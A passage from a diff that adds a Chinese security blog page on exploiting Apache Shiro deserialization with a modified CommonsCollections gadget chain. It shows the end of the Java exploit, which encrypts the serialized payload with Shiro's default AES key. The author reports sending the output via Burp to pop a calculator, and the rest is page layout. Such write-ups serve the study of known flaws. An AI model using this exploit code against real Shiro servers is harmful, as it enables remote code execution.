class="comment">//生成攻击Shiro的编码部分</span></span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(barr.toByteArray(), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 本地测试</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        System.out.println(barr);</span></span><br><span class="line"><span class="comment">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span></span><br><span class="line"><span class="comment">        Object obj1 = ois.readObject();*/</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行得到Base64编码数据，随后复制到bp，打到shiro上，顺利弹出计算器。<br><img src="https://s2.loli.net/2021/12/07/pyusvkoB4fZiVxQ.png" alt="1.png"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/12/05/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC3-demo/" rel="next" title="Java安全漫谈-CC3-demo">
+                <i class="fa fa-chevron-left"></i> Java安全漫谈-CC3-demo
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#使用CommonsCollections6攻击Shiro"><span class="nav-number">1.</span> <span class="nav-text">使用CommonsCollections6攻击Shiro</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#冲突与限制"><span class="nav-number">2.</span> <span class="nav-text">冲突与限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构造不含数组的反序列化Gadget"><span class="nav-number">3.</span> <span class="nav-text">构造不含数组的反序列化Gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#改造CommonsCollections6为CommonsCollectionsShiro"><span class="nav-number">4.</span> <span class="nav-text">改造CommonsCollections6为CommonsCollectionsShiro</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用CommonsCollectionsShiro攻击Shiro"><span class="nav-number">5.</span> <span class="nav-text">使用CommonsCollectionsShiro攻击Shiro</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最后补充几点"><span class="nav-number">6.</span> <span class="nav-text">最后补充几点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不使用InvokerTransformer的版本"><span class="nav-number">7.</span> <span class="nav-text">不使用InvokerTransformer的版本</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">189.7k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
